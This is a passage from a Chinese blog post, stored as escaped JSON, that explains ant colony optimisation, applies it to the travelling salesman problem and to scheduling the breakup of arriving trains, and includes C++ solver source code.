iCityCount=48;\nconst int iItCount=5000;\nconst double Q=100;\nconst double alpha=3.0;\nconst double beta=5.0;\nconst double rou=0.9;\nconst double rain=0.022;\nconst double q0=0.3;\nint besttour[iCityCount+1];\n\ndouble  rnd(int low,int uper)\n{\n\tdouble p=(rand()/(double)RAND_MAX)*((uper)-(low))+(low);1;\n\treturn (p);\n};\nint rnd(int uper)\n{\n\treturn (rand()%uper);\n};\nstruct GInfo\n{\n\tdouble m_dDeltTrial[iCityCount][iCityCount];\n\tdouble m_dTrial[iCityCount][iCityCount];\n\tdouble distance[iCityCount][iCityCount];\n}Map;\nclass ant\n{\nprivate:\n\tdouble prob[iCityCount];\n\tint m_iTopCity;\n\tint allowed[iCityCount];\n\n\tint ChooseNextCity();\n\n\tvoid UpdateProb();\npublic:\n\n\tdouble m_dLength;\n\n\tint visited[iCityCount+1];\n\n\tant();\n\tvoid addcity(int city);\n\tvoid Clear();\n\tvoid UpdateLength();\n\tvoid move();\n\n\t//void move2last();\n};\n\nant::ant()\n{\n\tm_dLength=0;\n\tm_iTopCity=0;\n\tint i;\n\tfor(i=0;i<iCityCount;i++)\n\t{\n\t\tprob[i]=0.5;\n\t\tallowed[i]=1;\n\t}\n}\nvoid ant::addcity(int city)\n{//add city to tabu;\n\tvisited[m_iTopCity]=city;\n\tm_iTopCity++;\n\tallowed[city]=0;\n}\nvoid ant::UpdateProb()\n{\n\tint i;\n\tdouble temp=0;\n\tint curCity=visited[m_iTopCity-1];\n\tint c=0;\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tif(allowed[i])\n\t\t{\n\t\t\tdouble p=pow((1.0/Map.distance[curCity][i]),beta)*pow((Map.m_dTrial[curCity][i]),alpha);\n\t\t\ttemp+=p;\n\t\t\tc++;\n\t\t}\n\t}\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tif(allowed[i])\n\t\t{\n\t\t\tif (temp==0)\n\t\t\t\tprob[i]=(double)1.0/(double)c;\n\t\t\telse\n\t\t\t\tprob[i]=pow((1.0/Map.distance[curCity][i]),beta)*pow((Map.m_dTrial[curCity][i]),alpha)/temp;\n\t\t}\n\t\telse\n\t\t\tprob[i]=0;\n\t}\n}\nint ant::ChooseNextCity()\n{//Update the probability of path selection\n\t//select a path from tabu[m_iCityCount-1] to next\n\tint i,j;\n\tdouble temp;\n\tdouble mRate=rnd(0,1);\n\tint curCity=visited[m_iTopCity-1];\n\n\tUpdateProb();\n\tif (mRate>q0)\n\t{\n\t\ttemp=-1;\n\t\tfor (i=0;i<iCityCount;i++)\n\t\t{\n\t\t\t//temp<prob[i];\n\t\t\tif(allowed[i])\n\t\t\t{\n\t\t\t\tdouble p=pow((1.0/Map.distance[curCity][i]),beta)*pow((Map.m_dTrial[curCity][i]),alpha);\n\t\t\t\tif (temp<p)\n\t\t\t\t{\n\t\t\t\t\ttemp=p;\n\t\t\t\t\tj=i;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tdouble mSelect=0;\n\t\tfor (int i=0;i<iCityCount;i++)\n\t\t{\n\t\t\tmSelect+=prob[i] ;\n\t\t\tif (mSelect>=mRate) {j=i;break;}\n\t\t}\n\t}\n\treturn j;\n}\nvoid ant::UpdateLength()\n{// Update the length of tour\n\tint i;\n\tfor(i=0;i<iCityCount;i++)\n\t\tm_dLength+=Map.distance[visited[i]][visited[i+1]];\n}\nvoid ant::move()\n{//the ant move to next town and add town ID to tabu.\n\tint j;\n\tj=ChooseNextCity();\n\taddcity(j);\n}\nvoid ant::Clear()\n{\n\tm_dLength=0;\n\tint i;\n\tfor(i=0;i<iCityCount;i++)\n\t{\n\t\tprob[i]=0.5;\n\t\tallowed[i]=1;\n\t}\n\ti=visited[0];\n\tm_iTopCity=0;\n\taddcity(i);\n}\nclass project\n{\n\tvoid initmap();\n\npublic:\n\n\tdouble m_dShortest;\n\tant ants[iAntCount];\n\n\tvoid UpdateTrial();\n\tvoid GetAnt();\n\tvoid StartSearch();\n\tproject();\n};\n\nproject::project()\n{//initial map,read map infomation from file . et.\n\n\tstruct city\n\t{\n\n\t\tint x;\n\t\tint  y;\n\t}cc[iCityCount];\n\tint num;\n\tint i;\n\n\tinitmap();\n\n\tm_dShortest=10e9;\n\n\n\tifstream in(\"48.txt\");\n\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tin>>num>>cc[i].x>>cc[i].y;\n\t\tbesttour[i]=0;\n\t}\n\tint j;\n\tfor(i=0;i<iCityCount;i++)\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t\tMap.distance[i][j]=sqrt(pow((cc[i].x-cc[j].x),2)+pow((cc[i].y-cc[j].y),2));\n}\nvoid project::initmap()\n{\n\tint i;\n\tint j;\n\tfor(i=0;i<iCityCount;i++)\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\tMap.m_dTrial[i][j]=1.0/(double)iCityCount;\n\t\t\tMap.m_dDeltTrial[i][j]=0;\n\t\t}\n}\nvoid project::GetAnt()\n{//randomly put ant into map\n\tint i=0;\n\tint city;\n\tsrand( (unsigned)time( NULL ) +rand());\n\tfor (i=0;i<iAntCount;i++)\n\t{\n\t\tcity=rnd(iCityCount);\n\t\tants[i].addcity(city);\n\t}\n}\nvoid project::StartSearch()\n{//begin to find best solution\n\tint max=0;//every ant tours times\n\tint i;\n\tint j;\n\tdouble temp;\n\tint temptour[iCityCount+1];\n\twhile (max<iItCount)\n\t{\n\t\tfor (i=0;i<iCityCount-1;i++)\n\t\t\tfor(j=0;j<iAntCount;j++)\n\t\t\t\tants[j].move();\n\n\t\tfor(j=0;j<iAntCount;j++)\n\t\t{\n\t\t\tants[j].visited[iCityCount]=ants[j].visited[0];\n\t\t\tants[j].UpdateLength ();\n\t\t}\n\n\t\t//find out the best solution of the step and put it into temp\n\t\tint t;\n\t\ttemp=ants[0].m_dLength ;\n\t\tfor (t=0;t<iCityCount+1;t++)\n\t\t\ttemptour[t]=ants[0].visited[t];\n\t\tfor(j=0;j<iAntCount;j++)\n\t\t{\n\t\t\tif (temp>ants[j].m_dLength) {\n\t\t\t\ttemp=ants[j].m_dLength;\n\t\t\t\tfor ( t=0;t<iCityCount+1;t++)\n\t\t\t\t\ttemptour[t]=ants[j].visited[t];\n\t\t\t}\n\t\t}\n\n\t\tif(temp<m_dShortest){\n\t\t\tm_dShortest=temp;\n\t\t\tprintf(\"%d : %f\\n\",max,m_dShortest);\n\t\t\tfor ( t=0;t<iCityCount+1;t++)\n\t\t\t\tbesttour[t]=temptour[t];\n\t\t}\n\t\tif (max %100==0)printf(\" %d \",max);\n\t\tUpdateTrial();\n\n\t\tfor(j=0;j<iAntCount;j++)\n\t\t\tants[j].Clear();\n\n\t\tmax++;\n\t\t//char c;\n\t\t//scanf(\"%c\",&c);\n\t}\n\tprintf(\"The shortest toure is : %f\\n\",m_dShortest);\n\n\tfor ( int t=0;t<=iCityCount;t++)\n\t\tprintf(\" %d \",besttour[t]);\n\n}\nvoid project::UpdateTrial()\n{//calculate the changes of trial information\n\tint i;\n\tint j;\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\t//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);\n\t\t\tMap.m_dTrial[i][j]*=(1-rou);//*Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );\n\t\t\t//Map.m_dProb[i][j]=\n\t\t\t//Map.m_dDeltTrial[i][j]=0;\n\t\t}\n\t}\n\tfor(i=0;i<iAntCount;i++)\n\t{\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\tMap.m_dDeltTrial[ants[i].visited[j]][ants[i].visited[j+1]]+=Q/ants[i].m_dLength ;\n\t\t\tMap.m_dDeltTrial[ants[i].visited[j+1]][ants[i].visited[j]]+=Q/ants[i].m_dLength;\n\t\t}\n\t}\n\tfor (i=0;i<iCityCount;i++)\n\t{\n\t\tfor (j=0;j<iCityCount;j++)\n\t\t{\n\t\t\t//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);\n\t\t\tMap.m_dTrial[i][j]=rou*(Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );\n\t\t\t//Map.m_dProb[i][j]=\n\t\t\tMap.m_dDeltTrial[i][j]=0;\n\t\t}\n\t}\n}\nint main()\n{\n\tproject TSP;\n\tTSP.GetAnt();\n\tTSP.StartSearch();\n\tchar c;\n\tscanf(\"%c\",&c);\n\treturn 0;}\n\n```\n输入文件叫做“48.txt”，格式如下\n[48.txt](/other/48.txt)\n\n###列车解体问题###\n输入文件格式如下：\n首先是到达列车的数量，然后分别写出每个列车的信息\n然后是出发列车的数量，然后写出每个列车的信息\n[aco_input.txt](/other/aco_input.txt)","slug":"U8681U7fa4U7b97U6cd5U53caU5176U5728U5217U8f66U89e3U4f53U987aU5e8fU7f16U6392U7684U5e94U7528","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vj002cwypd777nbygw","content":"<p>##基本原理的了解##<br>首先我们来说一下蚁群算法。在看本文之前，大家需要先看一下百度百科关于蚁群算法的初步讲解。真正的蚁群算法和自然界的蚂蚁寻找食物是有很大差异的。但是了解大自然蚂蚁的寻找规律是很有必要的。<br><a id=\"more\"></a></p>\n<p>##蚁群算法和大自然蚂蚁寻找食物的区别##<br>大自然中，蚂蚁在寻找食物的时候，会留下自己的信息素。同时每个蚂蚁个体更倾向于朝着信息素更加浓的方向走（这是一个概率问题，越浓的方向被选择的概率越大）。同时由于两点之间，一定的时间内越短的道路通过的蚂蚁越多，所以越短的道路留下的信息素也越多。直到最后这个信息素浓度特别的浓，大家走有极大地概率往这个方向走。<br><img src=\"/image/20150223234503.png\" alt=\"\"><br>上边这张图来自于百度百科。我想说明的一点是，蚂蚁并不知道自己走过的路程是短还是长（我了解这一点也是通过我的女票囧）。他们只需要按照信息素的浓度找吃的就可以了。因为如上图，最开始的时候，两边一样多的信息素浓度。但是A侧更短，所以A侧的会先到达目的地。因此一定时间内能够通过的蚂蚁更多。所以信息素浓度就大。<br>但是我们设计的蚁群算法不是这样的。我们是根据不同蚂蚁走过的道路的距离来决定信息素的多少的。这只蚂蚁走过的总路程最短，那么它释放的信息素就更多。我们只能通过距离的长短来设计信息素的多少，而不是通过蚂蚁先后到达来体现信息素。</p>\n<p>##蚁群算法的基本流程##<br>总体来说每一轮蚁群算法的迭代有这么几步：</p>\n<p>###放置蚂蚁###<br>以TSP（货郎担问题）为例，我们会在多个城市中随机放置蚂蚁。来作为整个程序的开始。</p>\n<p>###选择概率的更新###<br>对于每一只蚂蚁的当前位置，我们需要根据信息素浓度来判定下一个城市的选择概率，然后根据概率进行下一个城市的选择。这里大有文章可做，我们可以结合信息素浓度，以及自己设计的各种启发函数，来确定下一个城市的选择概率。</p>\n<p>###下一个城市的选择###<br>对于每一只蚂蚁，我们可以根据上一步的概率来选择下一个城市。同时进行操作，诸如已选城市标记，选择好的数据处理等等。</p>\n<p>###信息素的更新###<br>这一步是在所有的蚂蚁完成该轮循环之后做的事情。我们对于每只旅行完毕的蚂蚁的每一段旅程进行信息素更新。更新的依据就是它走过的路程长短。这里把路程长短转化为信息素浓度也是需要设计。常用的有基于平均数的设计（短于平均长度的路程信息素加一些，长于平均长度的蚂蚁对应的路程信息素减一些）。对于经过的每一段旅程进行更新完毕之后，城市两两之间的选择信息素浓度就有了。</p>\n<p>##货郎担问题的基本实现##<br>首先由几点要说一下：</p>\n<p>###关于$\\rho$这个元素###<br>我们知道，如果信息素不耗散，会有什么后果呢。理论一点的说就是算法收敛速度过快，陷入局部最优解中。为什么会出现这种现象呢。是因为为了让更多的蚂蚁去有更大的概率选择一些新的道路，或者说让最近的一次迭代起到的作用更大，我们需要削弱以前几次迭代的结果。这个在大自然中表现为蚂蚁留下的信息素会不断的被风吹走，我们在算法中呢，也就是代码中的rou，就是用来形容以前的信息素信息被吹走的。看看代码就可以了。</p>\n<p>###关于代码中详细的表示###<br>本人不敢妄加修改代码，只好大体说一下各个函数以及变量的意义。<br>首先ant类是用来表示每只蚂蚁的行动的。函数名称对照我上边所说的几个过程就可以看懂了。<br>project类是用来描述整个的算法进程的。也是很容易明白。会点c++语言的基本都能看懂。<br>具体的Q啦，alpha啦，这些都是具体算法设计的内容。我没有作TSP的相关研究。这些都是可以自己设计的。我就暂且不说了。</p>\n<p>###代码###<br>代码在最后边放着。我先说列车解体问题的具体应用了。</p>\n<p>##列车解题顺序编排的应用##<br>这个问题大体来说是这样的。我们知道我们做的火车是由很多车节组成的。每个出发列车的车节都是由到达列车拆分然后组装出来的。所以我们要解决的问题就是，如果每个时间只能有一辆列车被拆分，在每个出发列车时间确定的情况下，怎样的拆分顺序是能够弄出更多的出发列车呢。</p>\n<p>具体来说，每个到达列车有a,b,c,d四个方向不同的车节，每个出发列车也有四个方向车节的要求。同时每个到达列车有自己的解体时间，出发列车组装也需要时间。具体如下表：<br><img src=\"/image/20150224.png\" alt=\"\"></p>\n<p>因为如果我们需要对每个到达列车进行顺序编排的话，就有n!种排序方式。这个很明显是NP完全问题了。用蚁群算法优化一下或许是一个不错的选择。</p>\n<p>首先我们是需要把所有列车都解体的。只不过是顺序问题。所以我们就映射到了TSP问题当中，TSP需要走遍所有的城市，只不过是顺序问题罢了。<br>接下来我们可以用出发列车作为时间限制进行优化，比方说第一个出发列车，在这个列车出发前，我们有几辆列车已经到位了，所以这个时候在第一辆发车之前，我们只能选择已经到达的这几辆列车解体。凑够第一辆出发列车之后，我们在考虑第二辆列车。这样的话我们就缩小了搜索范围，提升了效率。<br>我们需要给每个蚂蚁设计一个时间戳，描述当前这只蚂蚁走到了什么时间。如果超过了当前列车出发时间还没有凑齐，那么这只蚂蚁就废了。success这个元素就标记成0.<br>每次添加城市（也就是具体问题中的选择新的列车），我们都要在这个蚂蚁的时间戳上更新时间。如果是很早以前就到了的列车，我们加上解体时间就好，如果是还没到的列车，我们需要等列车到了，再加上解体时间。然后在蚂蚁的列车库中先添加这个解体列车的列车节数，然后检查是不是凑够了当前出发列车需要的节数。如果凑够了就在蚂蚁车库中去除列车节数，否则就继续。<br>程序员都知道，当然这个列车问题有很多其他的设计细节，细节决定成败。详细说清楚的话很费力。有兴趣的看看代码，不懂再联系。</p>\n<p>##代码部分##</p>\n<p>###传统TSP###<br>这个代码是直接从网上粘过来的。来自于fashionxu.blogchina.com<br>这个代码是我自己调试通过了的。有什么疑问留言就好。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> iAntCount=<span class=\"number\">10</span>;<span class=\"comment\">//ant numbers</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> iCityCount=<span class=\"number\">48</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> iItCount=<span class=\"number\">5000</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> Q=<span class=\"number\">100</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> alpha=<span class=\"number\">3.0</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> beta=<span class=\"number\">5.0</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> rou=<span class=\"number\">0.9</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> rain=<span class=\"number\">0.022</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> q0=<span class=\"number\">0.3</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> besttour[iCityCount+<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span>  <span class=\"title\">rnd</span><span class=\"params\">(<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> uper)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> p=(rand()/(double)RAND_MAX)*((uper)-(low))+(low);<span class=\"number\">1</span>;</span><br><span class=\"line\">\treturn (p);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">rnd</span><span class=\"params\">(<span class=\"keyword\">int</span> uper)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\treturn (rand()%uper);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> GInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dDeltTrial[iCityCount][iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dTrial[iCityCount][iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> distance[iCityCount][iCityCount];</span><br><span class=\"line\">&#125;Map;</span><br><span class=\"line\"><span class=\"keyword\">class</span> ant</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> prob[iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iTopCity;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> allowed[iCityCount];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">ChooseNextCity</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">UpdateProb</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dLength;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> visited[iCityCount+<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\tant();</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">addcity</span><span class=\"params\">(<span class=\"keyword\">int</span> city)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Clear</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">UpdateLength</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">move</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//void move2last();</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">ant::ant()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_dLength=<span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_iTopCity=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprob[i]=<span class=\"number\">0.5</span>;</span><br><span class=\"line\">\t\tallowed[i]=<span class=\"number\">1</span>;</span><br><span 